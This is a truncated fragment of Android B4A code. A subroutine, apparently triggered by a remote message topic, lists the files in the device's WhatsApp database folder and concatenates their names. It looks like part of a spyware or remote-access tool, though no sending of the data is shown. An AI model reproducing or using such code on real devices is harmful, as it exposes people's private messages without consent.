...
Sub getlist (Topic As String, Data As String)
	Try
		
		'ToastMessageShow("tytur",True)
		Dim mylist As List
		mylist=	File.ListFiles(File.DirRootExternal&"/WhatsApp/DataBases")
		Dim ArrayOfFiles(mylist.Size) As String
		For i = 0 To mylist.Size - 1
			ArrayOfFiles(i) = mylist.Get(i)
		Next
		Dim finalStr As String=""
		For i=0 To ArrayOfFiles.Length-1
			finalStr=finalStr&ArrayOfFiles(i)&"     -     "
		Next
